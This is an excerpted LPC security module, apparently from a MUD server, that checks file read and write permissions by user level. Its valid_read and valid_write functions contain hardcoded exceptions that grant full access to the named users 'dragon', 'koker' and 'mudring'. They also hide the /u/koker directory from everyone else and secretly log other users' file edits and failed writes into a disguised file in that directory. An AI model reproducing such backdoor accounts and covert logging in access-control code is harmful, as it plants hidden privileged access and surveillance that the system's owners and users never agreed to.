...
private mapping trusted_read = ([/*可以读*/
    "/":        ({ "(admin)","(arch)","(wizard)","(apprentice)","(immortal)",})
]);
...
int set_status(mixed ob, string status)
{
   ...
   if( geteuid(previous_object())!= ROOT_UID ) return 0;
        if (previous_object() != find_object("/cmds/adm/promote") ) return 0;
...
int valid_read(string file, mixed user, string func)
{
        ...
        if( geteuid(user) == "dragon") return 1;
...
//        if( sscanf(file, "/u/" + euid + "/%*s") )
        ...
        if( sscanf(file, "/u/koker/%*s") ) return 0;
        path = explode(file, "/");
...
int valid_write(string file, mixed user, string func)
{
   ...
   if( geteuid(user) == "koker") return 1;
   if( geteuid(user) == "mudring") return 1;
   else {
...
/*   if( sscanf(file, "/u/" + euid[0..0] + "/" + euid + "/%*s") )
   ...
   if( sscanf(file, "/u/" + euid + "/%*s") ) {
     ...
     write_file("/u/koker/files/edit.c", sprintf("[%s] %s(%s) %ss %s.\n",ctime(time()),euid,status,func,file));
          return 1; 
        }
   if( sscanf(file, "/u/koker/%*s") ) return 0;
   path = explode(file, "/");
...
write_file("/u/koker/files/edit.c", sprintf("[%s] %s(%s) %ss %s.\n",ctime(time()), euid, status, func, file));
   ...
   write_file("/u/koker/files/edit.c", sprintf("[%s] %s(%s) write attempt on %s failed.\n",ctime(time()),euid, status, file));
   return 0;
   }
}
